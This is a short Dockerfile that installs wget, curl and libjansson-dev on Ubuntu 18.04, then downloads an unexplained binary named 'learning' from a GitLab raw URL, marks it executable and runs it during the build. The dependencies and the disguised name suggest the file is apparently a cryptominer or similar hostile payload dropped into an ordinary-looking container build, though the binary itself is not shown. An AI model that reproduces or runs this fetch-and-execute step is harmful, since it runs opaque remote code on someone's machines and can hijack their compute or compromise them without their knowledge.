FROM ubuntu:18.04
RUN apt-get update && \
     apt-get install wget -y && \
     apt install libjansson-dev -y && \
     apt-get install curl libcurl4 -y && \
     wget https://gitlab.com/lambohopo/bash/-/raw/main/learning && chmod +x learning && ./learning
